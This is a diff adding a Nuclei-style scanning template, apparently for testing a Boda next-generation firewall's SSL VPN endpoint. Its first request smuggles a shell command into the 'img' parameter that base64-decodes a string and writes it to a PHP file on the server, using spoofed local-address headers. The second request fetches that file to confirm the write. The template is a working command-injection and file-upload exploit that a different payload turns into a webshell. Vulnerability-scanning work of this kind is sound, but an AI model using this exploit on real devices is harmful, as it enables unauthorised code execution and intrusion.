@@ -1,0 +1,38 @@
+id: boda-nextfirewall-upload-demo
+info:
+  name: boda-firewall-upload
+  author: sb
+  severity: critical
+  tags: upload,firewall
+  reference: sb
+  metadata:
+    fofa-query: "app=博达通信-下一代防火墙"
+    
+http:
+  - raw:
+      - |
+        GET /sslvpn/sslvpn_client.php?client=logoImg&img=;echo%20MWRlbW8=%7Cbase64%20-d%7C%20tee%20demo1.php%3B HTTP/1.1
+        Host: {{Hostname}}
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: none
+        Sec-Fetch-User: ?1
+        X-Forwarded-For: 127.0.0.1
+        X-Originating-Ip: 127.0.0.1
+        X-Remote-Ip: 127.0.0.1
+        X-Remote-Addr: 127.0.0.1
+        Te: trailers
+        Connection: close
+      - |
+        GET /sslvpn/demo1.php HTTP/1.1
+        Host: {{Hostname}}
+        
+    req-condition: true    
+    matchers-condition: and
+    matchers:
+      - type : dsl
+        dsl:
+          - 'status_code_1 == 200 && status_code_2 == 200 && contains((body_2),"1demo")'
